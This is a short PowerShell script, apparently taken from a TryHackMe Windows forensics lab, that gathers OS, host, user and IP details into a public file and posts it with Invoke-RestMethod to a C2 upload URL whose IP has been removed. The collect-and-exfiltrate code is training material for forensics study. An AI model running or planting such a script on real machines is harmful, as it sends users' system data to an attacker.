# This is a nice clear example of StartUp script persistence without any malicious writes or executions to local or domain joined machines
# From https://tryhackme.com/r/room/windowsuseraccountforensics
# Only modification was to remove the IP from the $c2Server variable for idiot proofing and due-diligence reading

$dataPath = "C:\Users\Public\system_info.txt"
$c2Server = "http:// /upload" # IP removed 

# Simulate gathering sensitive data
$filePath = "C:\Users\Public\system_info.txt"
$info = "System Information Report - $(Get-Date)"
$info += "`n`n=== System Information ==="
$info += "`nOS Version: " + (Get-WmiObject -Class Win32_OperatingSystem).Caption
$info += "`nComputer Name: " + $env:COMPUTERNAME
$info += "`nUser: " + $env:USERNAME
$info += "`n`n=== Network Information ==="
$info += "`nIP Address: " + (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPv4Address.IPAddressToString

$data | Out-File -FilePath $dataPath

Write-Output "Data to be exfiltrated: "
Get-Content $dataPath

Invoke-RestMethod -Uri $c2Server -Method Post -InFile $dataPath -ContentType 'application/octet-stream'
